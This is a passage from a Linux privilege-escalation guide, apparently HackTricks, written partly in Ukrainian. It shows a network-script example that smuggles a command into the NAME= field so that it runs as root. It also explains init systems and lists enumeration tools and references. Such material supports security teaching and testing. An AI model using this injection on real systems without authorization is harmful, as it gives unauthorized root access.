**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd та rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами Linux**. Тут є скрипти для `start`, `stop`, `restart` і іноді `reload` сервісів. Їх можна виконувати безпосередньо або через символічні посилання у `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов'язаний з **Upstart**, новішою системою **керування сервісами**, введеною в Ubuntu, яка використовує конфігураційні файли для задач керування сервісами. Незважаючи на перехід до Upstart, скрипти SysVinit все ще використовуються разом із конфігураціями Upstart через рівень сумісності в Upstart.

**systemd** є сучасним ініціалізатором і менеджером сервісів, що пропонує розширені можливості, такі як запуск демонів за потребою, керування автоматичним монтуванням та знімки стану системи. Воно організовує файли в `/usr/lib/systemd/` для пакетів дистрибутива та в `/etc/systemd/system/` для модифікацій адміністратора, спрощуючи адміністрування системи.

## Інші прийоми

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай перехоплюють syscall, щоб надати привілейовану функціональність ядра userspace manager-у. Слабка аутентифікація manager-а (наприклад, перевірки підпису, засновані на FD-order, або ненадійні схеми паролів) може дозволити локальному додатку видавати себе за manager-а та ескалювати до root на вже рутованих пристроях. Докладніше та деталі експлуатації див. тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Посилання

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

{{#include ../../banners/hacktricks-training.md}}
